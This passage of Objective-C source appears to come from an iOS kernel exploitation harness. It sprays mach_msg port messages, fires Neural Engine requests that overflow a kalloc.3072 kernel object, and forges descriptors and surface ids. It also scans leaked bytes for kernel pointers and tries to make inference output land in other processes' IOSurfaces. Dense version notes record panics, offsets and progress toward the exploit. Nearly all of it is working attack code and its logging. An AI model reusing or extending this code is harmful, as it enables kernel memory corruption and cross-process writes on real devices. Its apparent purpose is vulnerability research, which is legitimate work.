                size_t padEnd = (size_t)(sizeof(port_msg_t) - sizeof(mach_msg_header_t));
                for (size_t j = padStart; !diff && j < padEnd; j++) {
                    if (actual[j] != 0) diff = 1;
                }
                if (diff) {
                    pairs[i].done = 1;
                    hits++;
                    if (body != 2u && body != (uint32_t)P044_PORT_DESC_N) g_cls_body_forged++;
                    /* mach_msg_port_descriptor_t type is the last byte of each 12-byte desc.
                       control descs sit at payload+0x4 and +0x10; type at +0x0f / +0x1b. */
                    if (!probe && (actual[0x0f] != 0 || actual[0x1b] != 0)) g_cls_desc_forged++;
                    if (probe && (actual[0x0f+12*2] != 0 || actual[0x0f+12*3] != 0)) g_cls_desc_forged++;
                    [out appendFormat:@"  HIT port-kind victim=%u (%s, payload diff, body=0x%x desc_type=%u/%u)\n",
                        i, probe ? "PROBE 8-desc" : "control 2-desc", body,
                        (unsigned)actual[0x0f], (unsigned)actual[0x1b]];
                    hexdump16(actual, 0, out);
                    kptr_scan(actual, (uint32_t)i, out);
                    fingerprint_scan(actual, probe ? (0x04 + 12 * P044_PORT_DESC_N) : 0x1c, out);
                    out_entry_scan(actual, out);
                    hexdump16(actual, 0x430, out); /* v50: raw tail - out entry @0x444 */
                    ev_push(5, i, kr, actual, 0);
                } else if (probe) {
                    [out appendString:@"  PROBE 8-desc victim clean (tile missed this element — reject path is where the forge shows)\n"];
                }
            } else if (kr != MACH_RCV_TIMED_OUT && kr != MACH_RCV_INVALID_NAME) {
                pairs[i].done = 1;
                hits++;
                g_cls_reject++;
                if (pairs[i].descN == P044_PORT_DESC_N) {
                    /* v49: probe victim rejected at copyout = the record grid
                       forged desc3..8 dispositions to 0x00 (record [1][1] pair
                       bytes land on disp offsets); kernel refused the copyout.
                       DESCRIPTOR-REGION FORGE on a live kmsg — kernel-visible. */
                    g_cls_desc_reject++;
                    [out appendFormat:
                        @"  *** DESC-TILE FORGE victim=%u recv kr=0x%x — PROBE 8-desc REJECTED at copyout: record bytes landed on desc3..8 (disps forged 0x11->0x00) ***\n",
                        i, kr];
                    [out appendFormat:@"      corrupt_msgh_size=0x%x (expected 0x%x)\n",
                        corruptSize, (unsigned)sizeof(port_msg_t)];
                    ev_push(6, i, kr, NULL, 0);
                } else {
                [out appendFormat:
                    @"  *** PORT-KIND SIGNAL victim=%u recv kr=0x%x — KERNEL REJECTED CORRUPTED DESCRIPTORS ***\n",
                    i, kr];
                [out appendFormat:@"      corrupt_msgh_size=0x%x (expected 0x%x)\n",
                    corruptSize, (unsigned)sizeof(port_msg_t)];
                [out appendString:@"      kernel rejected the kmsg. Occupancy smash, not copyout conversion.\n"];
                ev_push(1, i, kr, NULL, corruptSize);
                }
            }
            /* timed out = port empty = normal; leave for the watcher */
        }
    }
    return hits;
}

+ (int)startWitnesses:(NSMutableString *)out {
    int started = 0;
    memset(g_witness, 0, sizeof(g_witness));
    for (int k = 0; k < NEON_WITNESS_COUNT; k++) {
        neon_wit_t *w = &g_witness[k];
        for (int q = 0; q < 64; q++) {
            w->magic[q] = 0x4e45000000000000ULL | ((uint64_t)k << 32) | (uint64_t)q;
        }
        if (pthread_create(&w->th, NULL, neon_witness_worker, w) != 0) {
            w->th = 0;
            continue;
        }
        w->port = pthread_mach_thread_np(w->th);
        started++;
    }
    for (int spin = 0; spin < 500; spin++) {
        int allReady = 1;
        for (int k = 0; k < NEON_WITNESS_COUNT; k++) {
            if (g_witness[k].th && !g_witness[k].ready) {
                allReady = 0;
                break;
            }
        }
        if (allReady) break;
        usleep(1000);
    }
    [out appendFormat:@"  NEON witnesses armed: %d/%d  flavor=%d COUNT=%u sizeof=%zu\n",
        started, NEON_WITNESS_COUNT, ARM_NEON_STATE64,
        (unsigned)ARM_NEON_STATE64_COUNT, sizeof(arm_neon_state64_t)];
    return started;
}

+ (void)stopWitnesses {
    for (int k = 0; k < NEON_WITNESS_COUNT; k++)
        g_witness[k].quit = 1;
    for (int k = 0; k < NEON_WITNESS_COUNT; k++) {
        neon_wit_t *w = &g_witness[k];
        if (w->th) {
            pthread_join(w->th, NULL);
            w->th = 0;
        }
        if (w->port) {
            mach_port_deallocate(mach_task_self(), w->port);
            w->port = MACH_PORT_NULL;
        }
    }
}

+ (int)neon_scan:(NSMutableString *)out tag:(NSString *)tag {
    int mismatches = 0;
    int fingerprints = 0;
    int printed = 0;
    const int printCap = 32;
    for (int k = 0; k < NEON_WITNESS_COUNT; k++) {
        neon_wit_t *w = &g_witness[k];
        if (!w->th || !w->port) continue;
        if (thread_suspend(w->port) != KERN_SUCCESS) continue;
        arm_neon_state64_t st;
        memset(&st, 0, sizeof(st));
        mach_msg_type_number_t cnt = ARM_NEON_STATE64_COUNT;
        kern_return_t kr = thread_get_state(w->port, ARM_NEON_STATE64,
                                            (thread_state_t)&st, &cnt);
        thread_resume(w->port);
        if (kr != KERN_SUCCESS) continue;

        uint64_t *v = (uint64_t *)st.__v;
        for (int q = 0; q < 64; q++) {
            uint64_t cur = v[q];
            uint64_t was = w->magic[q];
            if (cur != was) {
                mismatches++;
                if (printed < printCap) {
                    [out appendFormat:@"  *** NEON-WITNESS HIT wid=%d qword=%d val=0x%016llx (was 0x%016llx) ***\n",
                        k, q, (unsigned long long)cur, (unsigned long long)was];
                    printed++;
                }
            }
            uint32_t hi = (uint32_t)(cur >> 32);
            if (hi >= 0x000000c0u && hi <= 0x000000ffu) {
                fingerprints++;
                if (printed < printCap) {
                    [out appendFormat:@"  *** NEON-FINGERPRINT wid=%d qword=%d val=0x%016llx (0xcN counter) ***\n",
                        k, q, (unsigned long long)cur];
                    printed++;
                }
            }
            if (q + 1 < 64 &&
                hi >= 0x000000c0u && hi <= 0x000000ffu &&
                v[q + 1] == 0x0000000100000001ULL) {
                if (printed < printCap) {
                    [out appendFormat:@"  *** NEON-FILL-STRIDE wid=%d qword=%d val=0x%016llx nxt=0x%016llx (16B fill fingerprint) ***\n",
                        k, q, (unsigned long long)cur, (unsigned long long)v[q + 1]];
                    printed++;
                }
            }
        }
    }
    [out appendFormat:@"  NEON-WITNESS[%@]: baseline_mismatch=%d fingerprint=%d printed=%d/%d\n",
        tag, mismatches, fingerprints, printed, printCap];
    return mismatches + fingerprints;
}

+ (void)controlRecv:(pair_t *)pairs out:(NSMutableString *)out {
    (void)pairs;
    (void)out;
#if P044_CONTROL_RECV
    for (uint32_t i = (PAIR_COUNT / 2); i < PAIR_COUNT; i++) {
        if (pairs[i].victim && !pairs[i].done && pairs[i].kind == 1) {
            uint8_t actual[PAYLOAD_SIZE];
            uint32_t corruptSize = 0;
            kern_return_t kr = recv_msg_sz(pairs[i].victim, actual, RECV_WAIT_MS_CTRL,
                                           &corruptSize, P044_EXPECT_PORTK);
            if (kr == MACH_MSG_SUCCESS) {
                [out appendFormat:@"  CONTROL port-kind victim=%u kr=0x%x (SUCCESS; pre-fire port-kind recv is benign)\n",
                    i, kr];
            } else if (kr == MACH_RCV_TOO_LARGE) {
                [out appendFormat:@"  CONTROL port-kind victim=%u kr=0x%x (TOO_LARGE here is benign; corrupt_msgh_size=0x%x)\n",
                    i, kr, corruptSize];
            } else {
                [out appendFormat:@"  CONTROL port-kind victim=%u kr=0x%x (unexpected) corrupt_msgh_size=0x%x\n",
                    i, kr, corruptSize];
            }
            /* re-send so the pre-fire baseline does not consume the victim */
            send_port_msg(pairs[i].victim, i, pairs[i].descN);
                [out appendFormat:@"  CONTROL: re-queued port-kind victim=%u for fire\n", i];
            pairs[i].done = 0;
            return;
        }
    }
    [out appendString:@"  CONTROL: no mid-array port-kind victim found\n"];
#else
    (void)pairs;
    [out appendString:@"  CONTROL: disabled (P044_CONTROL_RECV=0)\n"];
#endif
}

/* v48 F4: post-fire reclaim read-back. Panic-B shape: the 62 spilled records
   persist in the freed kalloc.3072 element until zone reuse. Fresh 0xc00
   IOSurface allocations may reclaim that element; reading the raw base (no
   fill) shows any surviving [forge sid][0xcN][1][1] records. */
+ (int)reclaimReadbackOut:(NSMutableString *)out {
    if (!p044_sfCreate || !p044_sfBase || !p044_sfGetID || !p044_sfAllocSz) {
        [out appendString:@"  reclaim: surface syms unavailable\n"];
        return 0;
    }
    int hits = 0;
    for (uint32_t i = 0; i < P044_RECLAIM_SURF; i++) {
        CFTypeRef s = p044_surface_create(0xc00, out);
        if (!s) break;
        uint8_t *base = (uint8_t *)p044_sfBase(s);
        size_t n = p044_sfAllocSz(s);
        if (!base || !n) {
            CFRelease(s);
            continue;
        }
        if (n > 0xc00) n = 0xc00;
        int saw = 0;
        for (size_t j = 0; j + 16 <= n; j += 4) {
            uint32_t sid = *(uint32_t *)&base[j];
            uint32_t sym = *(uint32_t *)&base[j + 4];
            if (sym >= 0xc0u && sym <= 0xffu &&
                *(uint32_t *)&base[j + 8] == 1u &&
                *(uint32_t *)&base[j + 12] == 1u) {
                int forged = 0;
                for (uint32_t k = 0; k < g_forgeCount; k++) {
                    if (g_forgeSids[k] == sid) { forged = 1; break; }
                }
                saw++;
                if (forged) {
                    g_cls_readback++;
                    g_cls_forge_sid++;
                    [out appendFormat:@"    *** RECLAIM FORGED-SID surf=%u @0x%zx sid=%u sym=0x%x (record read-back from the spilled hole) ***\n",
                        i, j, sid, sym];
                } else {
                    [out appendFormat:@"    *** RECLAIM RECORD surf=%u @0x%zx sid=%u sym=0x%x (foreign residue) ***\n",
                        i, j, sid, sym];
                }
            }
        }
        if (!saw && i == 0) {
            [out appendString:@"  reclaim[0]: no record residue in first 0xc00 surface (kernel may zero on alloc)\n"];
        }
        CFRelease(s);
    }
    return hits + g_cls_readback;
}

#pragma mark - Model B (v47 E1: second live request / consumer)

+ (MLModel *)loadModelB:(NSMutableString *)out {
    NSBundle *bundle = [NSBundle mainBundle];
    NSURL *url = [bundle URLForResource:MODEL_B_NAME withExtension:@"mlmodelc"];
    if (!url) {
        NSURL *src = [bundle URLForResource:MODEL_B_NAME withExtension:@"mlmodel"];
        if (src) {
            NSError *cerr = nil;
            url = [MLModel compileModelAtURL:src error:&cerr];
            if (!url) {
                [out appendFormat:@"  STOP: B compile failed: %@\n", cerr.localizedDescription];
                return nil;
            }
        }
    }
    if (!url) {
        [out appendFormat:@"  STOP: model B '%@' not found in bundle\n", MODEL_B_NAME];
        return nil;
    }
    MLModelConfiguration *cfg = [[MLModelConfiguration alloc] init];
    cfg.computeUnits = MLComputeUnitsAll;
    NSError *err = nil;
    MLModel *m = [MLModel modelWithContentsOfURL:url configuration:cfg error:&err];
    if (!m) {
        [out appendFormat:@"  STOP: B load failed: %@\n", err.localizedDescription];
        return nil;
    }
    [out appendFormat:@"  B loaded: %@ (%@)\n", MODEL_B_NAME, url.lastPathComponent];
    return m;
}

+ (MLDictionaryFeatureProvider *)providerB:(NSMutableString *)out {
    NSMutableDictionary<NSString *, MLFeatureValue *> *features =
        [NSMutableDictionary dictionary];
    for (uint32_t i = 0; i < 127u; i++) {
        NSString *name = [NSString stringWithFormat:@"x_%03u", i];
        NSError *err = nil;
        MLMultiArray *array = [[MLMultiArray alloc] initWithShape:@[@1]
                                                       dataType:MLMultiArrayDataTypeDouble
                                                          error:&err];
        if (!array) {
            [out appendFormat:@"  STOP: B multiarray failed for %@: %@\n",
                name, err.localizedDescription];
            return nil;
        }
        /* v48 F3 B-sentinel fix: v47 used i+1 (1..127) — min model gives y=1
           always, insensitive to smashes. All-613 baseline: any spilled
           record sid (< 613) drops y -> sensitive consumer. */
        array[0] = @(613.0);
        features[name] = [MLFeatureValue featureValueWithMultiArray:array];
    }
    NSError *err = nil;
    MLDictionaryFeatureProvider *provider =
        [[MLDictionaryFeatureProvider alloc] initWithDictionary:features error:&err];
    if (!provider) {
        [out appendFormat:@"  STOP: B provider failed: %@\n", err.localizedDescription];
        return nil;
    }
    return provider;
}

/* One live B predict. Returns y (first output) or NAN on failure. */
+ (double)predictB:(MLModel *)m provider:(MLDictionaryFeatureProvider *)provider
               tag:(NSString *)tag out:(NSMutableString *)out {
    if (!m || !provider) return NAN;
    NSDate *t0 = [NSDate date];
    NSError *err = nil;
    id<MLFeatureProvider> pred = [m predictionFromFeatures:provider error:&err];
    double y = NAN;
    if (pred) {
        NSString *outName = [pred.featureNames anyObject];
        MLFeatureValue *v = outName ? [pred featureValueForName:outName] : nil;
        if (v && v.type == MLFeatureTypeMultiArray) {
            MLMultiArray *ma = v.multiArrayValue;
            y = ma.count ? [ma[0] doubleValue] : NAN;
        } else if (v && v.type == MLFeatureTypeDouble) {
            y = v.doubleValue;
        }
    }
    [out appendFormat:@"  B[%@] y=%s%.0f t=%.2fs err=%@\n",
        tag, isnan(y) ? "<" : "", isnan(y) ? 0.0 : y,
        -[t0 timeIntervalSinceNow],
        err ? err.localizedDescription : @"-"];
    return y;
}

+ (NSString *)tap {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"=== p044 session %@ BUILD %@ ===\n",
        LabLocalMilitaryNow(), P044_BUILD];
    [out appendString:@"CoreML staging + mach_msg spray + _ANEClient request fire.\n"];
    [out appendString:@"Uses bundled model/ MIL dir (addchain-191: on-device ANECCompile in PHASE 3b) or override .mlmodelc + _ANERequest built from OUR surfaces.\n"];
    [out appendFormat:@"v49 desc-tile: same _ANEClient fire; TAIL 8 port-kind victims carry 8 port descs (descs 3..8 sit in the ANE record tile at body+0x1c..0x64); non-tail port-kind = 2-desc v48.1 control. NEON=%u PORT_VICTIM_EVERY=%u HOLE_MODE=%d.\n",
        (unsigned)NEON_WITNESS_COUNT, (unsigned)PORT_VICTIM_EVERY, P044_HOLE_MODE];
    [out appendString:@"v50 consume-forge: B predict launches t-1ms so B's mapRequest object takes the freelist top and A's fire takes the hole BELOW it - A's fill lands INSIDE B's live prewire table (entries 6..68 = our sids). Signals: yBc != yB1 (B read our staged 16KB surfaces), B mid-prewire error, or B wedge. Plus: out_entry scan for A's OUTPUT record (sym 0xfe @body+0x444; the type-2 loop's flags word differs from [1][1], v49's scan was blind to it) and a raw body+0x430 tail dump on every hit.\n"];
    [out appendString:@"v51 foreign-census: v50 double-tap proved the fill, the OUTPUT entry shape ({outSid,0,1,2} at body+0x444 — scan now matches it), and that CoreML-B never re-prewires (cached program, yBc dead t=0.00s). New PHASE 3c.5: IOSurfaceLookup(1..1200) with NO size filter — if foreign-process surfaces resolve by global id, the OUTPUT-SID lane opens with no race and no clobber (request output sid = foreign surface -> ANE writes the inference result into their memory). MemoryMapRequest_gated consumer validates sid->IOSurface, size vs expected, symbol vs model counts — foreign>0 means those validations are the only gate.\n"];
    [out appendString:@"v52 foreign-out: v51 census ANSWERED IT — 383 foreign surfaces resolve by global id, ALL exactly 16384 B (= A's expected output size, size validation passes). The request's OUTPUT is now bound to the first foreign census hit: consumer resolves it, maps it, and if inference runs the ANE writes the result into THEIR memory. Oracles: pre/post content diff on the foreign surface (PHASE 6f) + IOSurfaceGetUseCount pre/post (mapping evidence even if the 254-in reject kills inference). Spilled out-entry now carries the FOREIGN sid. Consumer confirmed reading sids from the ENTRY ARRAY (note 120 s8) — the out-entry in any spill is the foreign sid verbatim.\n"];
    [out appendString:@"v53 foreign-out-armed: v52 runs 2-3 exposed an ORDERING BUG — the census sat AFTER the request build, so g_foreignOutSid was 0 at bind time and the lane never armed (out-entry sid = own output = lastInput+1, foreign target untouched; run 1 panicked at the KNOWN fill pc 0x874c1fc, caller 0xa5f74d4, x26=0xc0, slide 0x22ab4000 — same GZAlloc signature as note 117). v53 moves the census to PHASE 3a.5 BEFORE the build: pre-creation, every hit is genuinely foreign. Watch for [v53] OUTPUT-SID LANE ARMED in PHASE 3c and validate=%d — validate=1 with a foreign output would mean ownership is NOT checked userland-side.\n"];
    [out appendString:@"v54 qos2: single variable — compile+load qos 0x15→2 (PoC parity). Three taps: status=0x2 statusType=0x9 IDENTICAL to v53 → qos CLOSED. Foreign sid spilled in out-entry n=4 (167/171/170), ARMED lane, validate=1, no panic; runs 2+3 shared programHandle 0x6c241723 (same boot, cache-key deterministic). v55 = full PoC transport: MIL bundle (model/ dir), key XVRC27/mach_msg_min/model.anehash, cacheID nil, MIL opts dict. v55a = PoC-parity resolver (flat bundle-root candidate) + explicitFolders so model/ ships as a dir.\n"];
    [out appendString:@"v56 smallgeo+lane+stillness (notes 126/127): panic pack proved CheckandPrewire marshals into a FIXED 192-record kalloc.3072 object — 255-entry requests spill records 192+ ([sid][flag][1][1], flag 0xc0..0xfe sequential); the Oct-6 20:28 abort was entry #193 str'ing past a page-terminating element (x25+0xC00==far), and 3 MAF panics dumped the same record stream in kalloc.3072/1536/32. So 0xe00002c2 = kIOReturnBadArgument is the arg check, not budget. v56: REQ_IN_BYTES 602112→0x4000 (size-validation vs arg-check test), MIL handle==0 retries the mlmodelc URL + v54 transport so the direct lane arms, and the census target is stillness-checked (1.2 s re-diff — movers are own CoreML/Siri staging, the 6f false positive). Sid-band re-read: census 'foreign' band = OUR OWN staging surfaces; output-sid lane story closed.\n"];
    [out appendString:@"v57 sidreval (note 129 risk + 130 plan): staged sids 161..878 overlap the census band 162–610, and the out target is picked PRE-CREATION — if the picked surface dies before the build, a NEW surface (ours or system) inherits its sid and the lane silently writes OUR memory. v57 re-validates the lane AFTER all surfaces are created: resolved object must not CFEqual any of our staged surfaces, size must still be 0x4000, and the pre-fire snapshot + useCount are re-taken at arm time so the pre/post diff measures only the fire. Look for [v57] OUTPUT-SID LANE ARMED (clean) vs [v57] SID ALIAS (dropped — census target was recycled). Also next run: capture the KERNEL log during the fire — 'MemoryMapRequest for 255 buffers, result: 0xe00002c2' printing for OUR request decides marshaling-count vs sid-validation as the 0x2/0x9 reject (note 130).\n"];
    [out appendString:@"v58 sweep scaffold (note 130 Phase K1): write N to /var/mobile/Documents/p044_req_in.txt (one line) before tapping P044 — this tap fires with N inputs instead of 254 and the file is consumed (one file = one deliberate fire, no persistence across force-quits). Sweep protocol: N = 193, 196, 200, 224, 255; (N-192) = records CheckandPrewire writes PAST kalloc.3072. Goal: max N that completes without panic + kernel-log capture each run. With N != 254 the out-entry moves off symbolIndex 254 / body+0x444 — the pattern scan ({outSid,0,1,2}) still finds it.\n"];
    [out appendString:@"v60 passthrough (Oct-12 20:23): XVRC27_254in_passthrough — same fire, same OUTPUT-SID lane, same census/stillness/out-entry scan; ONLY the model changes (addchain -> passthrough). The 23F77 reject (status=0x2 statusType=0x9 Program Inference error) + the rig's pred=FAILED (accepted, only the 2-byte 0x6a58 header landed) are split by this run: program-complexity cause -> ACCEPTED here (fill + foreign write in ONE fire on 23F77); input-count cause -> rejected again (next vehicle = B model 127in + 1out = 128 records, NO overflow, inference proven to complete on 23F77 y=613 — the foreign OUTPUT sid rides the in-bounds OUTPUT record through the size/symbol gates). Oracles: foreign full-surface pre/post diff + useCount + OUR input fill pattern (0x41..0x50 words) in the foreign surface = OUR content in THEIR memory + sidecar p044_outdump.bin.\n"];
    [out appendString:@"v49 outcome (09:41): BAR HALF ONE PASSED - 62 forged sids {870..931, 0xc0..0xfd} received back from a LIVE port-kind victim at body+0x64..0x434 = exactly the tile end. Fill starts at victim body+0x64; desc-region forge (copyout reject) is the same landing 0x48 earlier. Field-window math (note 118 s3): type==0 never forms from {sid,0xcN,1,1}; desc conversion needs a different record pattern - the consume path is the door.\n"];
    [out appendString:@"Oct-2 panic pack: record area = dedicated kalloc.3072 (192x16); GZAlloc guard abort (pc=+0x18C store) and modified-after-free are the two freed-lane failure modes. Hole lane CLOSED.\n"];
    [out appendString:@"Run#1 proof: raw IOConnect conn CLOSED (handle binds to sharedConnection; sel0 kr=0x5, sel2 0xe00002c2).\n"];
    [out appendString:@"Landing lane per build: HOLE_MODE=1 freed hole + reclaim read-back; 0 = live-kmsg neighbor.\n"];
    [out appendString:@"Occupancy HIT is a 3072 store of ANE records. NOT conversion. NOT hasKread.\n"];
    [out appendString:@"record_forge: forge_seen>0 = spilled body carries client-chosen sids (bar half one).\n\n"];

    pthread_mutex_lock(&g_evLock);
    g_evCount = 0;
    g_evTotal = 0;
    memset(g_events, 0, sizeof(g_events));
    pthread_mutex_unlock(&g_evLock);
    cls_reset();
    p044ReqInOverride = 0;

    /* v58 REQ_IN sweep loader: p044_req_in.txt with a single "N" line
       overrides the 191-input default for THIS tap only (deleted on read —
       each file write is one deliberate fire; the sweep never persists
       across force-quits). v60 FIX: /var/mobile/Documents is NOT
       app-readable (same sandbox bug class as the v59 sidecar) — the flag
       now lives in the app-container Documents dir the p044 log + sidecar
       use. Write via SSH/Filza into the app container:
       .../Data/Application/&lt;UUID&gt;/Documents/p044_req_in.txt */
    {
        NSString *sweepDocs = NSSearchPathForDirectoriesInDomains(
            NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
        NSString *sweepPath = [sweepDocs stringByAppendingPathComponent:@"p044_req_in.txt"];
        NSString *s = [NSString stringWithContentsOfFile:sweepPath
                                                encoding:NSUTF8StringEncoding error:NULL];
        if (s) {
            NSCharacterSet *nonDigits = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
            NSString *digits = [[s componentsSeparatedByCharactersInSet:nonDigits]
                                  componentsJoinedByString:@""];
            uint32_t n = (uint32_t)digits.integerValue;
            if (n >= 2 && n <= 4096) {
                p044ReqInOverride = n;
                [out appendFormat:@"  [v58] REQ_IN OVERRIDE=%u (from app Documents/p044_req_in.txt; file consumed)\n", n];
            } else {
                [out appendFormat:@"  [v58] p044_req_in.txt present but N=%u out of range 2..4096 — default 191 kept\n", n];
            }
            unlink(sweepPath.fileSystemRepresentation);
        }
    }

    /* v60 model flag: app Documents/p044_model.txt, one line = the model
       NAME (e.g. XVRC27_254in_passthrough). Consumed on read (one file =
       one deliberate fire). The name must exist as .mlmodelc in the bundle
       and contain no path separator. Default stays addchain. */
    {
        NSString *docs = NSSearchPathForDirectoriesInDomains(
            NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
        NSString *flagPath = [docs stringByAppendingPathComponent:@"p044_model.txt"];
        NSString *s = [NSString stringWithContentsOfFile:flagPath
                                                encoding:NSUTF8StringEncoding error:NULL];
        if (s) {
            NSString *name = [[s componentsSeparatedByCharactersInSet:
                [NSCharacterSet newlineCharacterSet]] firstObject];
            name = [name stringByTrimmingCharactersInSet:
                [NSCharacterSet whitespaceAndNewlineCharacterSet]];
            if (name.length && [name rangeOfString:@"/"].location == NSNotFound) {
                NSURL *probe = [[NSBundle mainBundle] URLForResource:name
                                                        withExtension:@"mlmodelc"];
                if (probe) {
                    g_modelNameOverride = [name copy];
                    [out appendFormat:@"  [v60] MODEL OVERRIDE=%@ (from app Documents/p044_model.txt; file consumed)\n", name];
                } else {
                    [out appendFormat:@"  [v60] p044_model.txt: '%@' has no .mlmodelc in bundle — default kept (%@)\n",
                        name, COREML_MODEL_NAME];
                }
            } else {
                [out appendFormat:@"  [v60] p044_model.txt malformed (empty or contains '/') — default kept (%@)\n",
                    COREML_MODEL_NAME];
            }
            unlink(flagPath.fileSystemRepresentation);
        } else {
            /* v60.1: file-absent was SILENT (21:03 run burned a fire on the
               addchain default with no marker line). Loud miss + the exact
               searched path so a wrong/stale container UUID can never
               swallow the override again. ASCII only (em-dash mojibakes
               through the log channel). Log-only, no behavior change. */
            [out appendFormat:@"  [v61b] MODEL-FLAG MISS: Documents/p044_model.txt not found — default = addchain-191 B1 (in-bounds primitive test; no override needed). Override is OPTIONAL: write ONE bundled .mlmodelc NAME (e.g. XVRC27_254in_passthrough) into this exact path via SSH/Filza, force-quit, then tap again:\n    %@\n", flagPath];
        }
    }

    NSString *stop = [LabDeviceProfile stopUnlessA14_23F77:@"p044"];
    if (stop) { [out appendString:stop]; p044_write_log(out); return out; }
    [out appendString:[LabDeviceProfile identBlock]];
    p044_write_log(out);

    // 1. Find model (v61b: addchain-191 B1 = MIL-DIR lane FIRST. The bundle
    //    ships model/ (model.mil/options.plist/weights1.bin) and NO
    //    XVRC27_191in_1out_addchain.mlmodelc — v61 ran findCoreMLModelURL
    //    here and dead-ended ("No .mlmodelc or .mlmodel in bundle") before
    //    the ANE fire ever armed. Non-addchain (override) keeps the lane.)
    NSURL *modelURL = nil; /* MLModel A source; nil on the MIL lane */
    if (p044_model_is_addchain()) {
        NSURL *milPhase1 = [self findMilModelURL:out];
        if (!milPhase1) {
            [out appendString:@"  STOP: addchain-191 B1 needs the bundled model/ MIL dir (no 191in .mlmodelc exists)\n"];
            p044_write_log(out); return out;
        }
        [out appendString:@"  [v61b] MIL-dir lane: model A = on-device ANECCompile (PHASE 3b); "
                          "CoreML predict lane (coreml-fallback) unavailable this boot — predOK is NOT the oracle, the ANE fire is\n"];
    } else {
        modelURL = [self findCoreMLModelURL:out];
        if (!modelURL) { p044_write_log(out); return out; }
    }

    // 1b. model-name guard (log only, no abort)
    if (p044_model_is_addchain()) {
        [out appendFormat:@"  MODEL-NOTE: addchain model confirmed ('%@')\n", p044_model_name()];
    } else {
        [out appendFormat:@"  MODEL-NOTE: model '%@' (non-addchain) — verdict FLAG re-based: with the OUTPUT-SID lane armed, prediction FAIL is expected (the result, if any, went to the FOREIGN output); prediction OK with foreign diff=0 means the OUTPUT record did NOT steer (lane failed silently)\n",
            p044_model_name()];
    }
    p044_write_log(out);

    // 2. Load model A (the OOB fire) — skipped on the MIL lane (model stays nil)
    MLModel *model = nil;
    if (modelURL) {
        model = [self loadCoreMLModel:modelURL out:out];
        if (!model) { p044_write_log(out); return out; }
    }

    // 2b. Load model B (v47 E1: second live request / consumer)
    MLModel *modelB = [self loadModelB:out];
    if (!modelB) {
        [out appendString:@"  STOP: model B unavailable — record forge cannot run\n"];
        p044_write_log(out);
        return out;
    }
    p044_write_log(out);

    // 3a. IOSurface dlsym (request surfaces need create/getid/base/lock)
    [out appendString:@"\n=== PHASE 3a: IOSurface dlsym ===\n"];
    if (!p044_surface_syms(out)) {
        [out appendString:@"  STOP: IOSurface dlsym unavailable\n"];
        p044_write_log(out);
        return out;
    }
    p044_write_log(out);

    // 3a.5 (v53) FOREIGN-SID CENSUS + OUT-SID TARGET SELECT — runs BEFORE the
    //   request build so g_foreignOutSid is set when p044_ane_build_request
    //   binds the output. (v52 bug, runs 2-3: census sat after the build —
    //   the lane never armed and the out-entry stayed our own output sid.)
    //   Pre-creation: we have not made any surfaces yet, so EVERY hit here is
    //   genuinely foreign. The first hit becomes the OUTPUT-SID LANE target;
    //   its content (64B) + use count are snapshotted pre-fire (read-only
    //   lock, kIOSurfaceLockReadOnly=1 — no writes, no sync).
    //   MemoryMapRequest_gated consumer: resolves sid -> IOSurface from the
    //   ENTRY ARRAY, validates plane/size vs the model's expected buffer size,
    //   validates symbol index vs the model's counts. Foreign 0x4000 surfaces
    //   pass all three for A's OUTPUT slot (383 hits, all 16384 B — v51 runs).
    [out appendString:@"\n=== PHASE 3a.5: foreign-sid census + OUT-SID TARGET SELECT (IOSurfaceLookup 1..1200, no size filter; pre-creation) ===\n"];
    if (p044_sfLookup) {
        uint32_t ourSids[1024]; size_t nOur = 0;
        for (uint32_t k = 0; k < g_nSurf && nOur < 1024u; k++)
            if (g_surfs[k]) ourSids[nOur++] = p044_sfGetID(g_surfs[k]);
        uint32_t forFirst[8]; size_t nFirst = 0;
        int foreignHits = 0, lookNull = 0;
        for (uint32_t sid = 1; sid <= 1200; sid++) {
            CFTypeRef f = p044_sfLookup(sid);
            if (!f) { lookNull++; continue; }
            BOOL ours = NO;
            for (size_t k = 0; k < nOur && !ours; k++)
                if (ourSids[k] == sid) ours = YES;
            if (!ours) {
                foreignHits++;
                size_t sz = p044_sfAllocSz ? p044_sfAllocSz(f) : 0;
                [out appendFormat:@"  [for] sid=%u size=%zu\n", sid, sz];
                if (nFirst < 8) forFirst[nFirst++] = sid;
            }
            CFRelease(f);
        }
        [out appendFormat:@"  census: lookup-null=%d foreign-hits=%d ours=%zu\n",
            lookNull, foreignHits, nOur];
        /* v56 STILLNESS CHECK (note 126 §3): a target that mutates on its own
           (Siri VAD / our own CoreML staging surfaces — the census "foreign"
           band is most likely our OWN staging, not cross-process) poisons the
           pre/post diff. The 6f "cross-process write signal" was exactly this
           false positive. Pick the first candidate byte-stable across a
           1.2 s read-only re-diff; movers are skipped (excludes live
           writers). Read-only lock (kIOSurfaceLockReadOnly=1) — no writes. */
        for (size_t k = 0; k < nFirst && g_foreignOutSid == 0; k++) {
            uint32_t sid = forFirst[k];
            CFTypeRef f = p044_sfLookup(sid);
            if (!f) continue;
            size_t sz = p044_sfAllocSz ? p044_sfAllocSz(f) : 0;
            uint8_t snapA[sizeof(g_foreignSnap)], snapB[sizeof(g_foreignSnap)];
            uint32_t ucA = p044_sfUseCount ? p044_sfUseCount(f) : 0;
            BOOL gotA = NO, gotB = NO;
            if (p044_sfLock(f, 1, NULL) == 0) {
                uint8_t *b = (uint8_t *)p044_sfBase(f);
                if (b) { memcpy(snapA, b, sizeof(snapA)); gotA = YES; }
                p044_sfUnlock(f, 1, NULL);
            }
            CFRelease(f);
            if (!gotA) {
                [out appendFormat:@"  [v56] stillness sid=%u size=%zu: pre snapshot FAILED — skipped\n",
                    sid, sz];
                continue;
            }
            [NSThread sleepForTimeInterval:1.2];
            f = p044_sfLookup(sid);
            if (!f) continue;
            uint32_t ucB = p044_sfUseCount ? p044_sfUseCount(f) : 0;
            if (p044_sfLock(f, 1, NULL) == 0) {
                uint8_t *b = (uint8_t *)p044_sfBase(f);
                if (b) { memcpy(snapB, b, sizeof(snapB)); gotB = YES; }
                p044_sfUnlock(f, 1, NULL);
            }
            CFRelease(f);
            BOOL still = gotB && memcmp(snapA, snapB, sizeof(snapA)) == 0;
            [out appendFormat:@"  [v56] stillness sid=%u size=%zu %s (useCount %u→%u)\n",
                sid, sz, still ? "STABLE — target picked" : "moving — skipped",
                ucA, ucB];
            if (still) {
                g_foreignOutSid = sid;
                g_foreignUsePre = ucB;
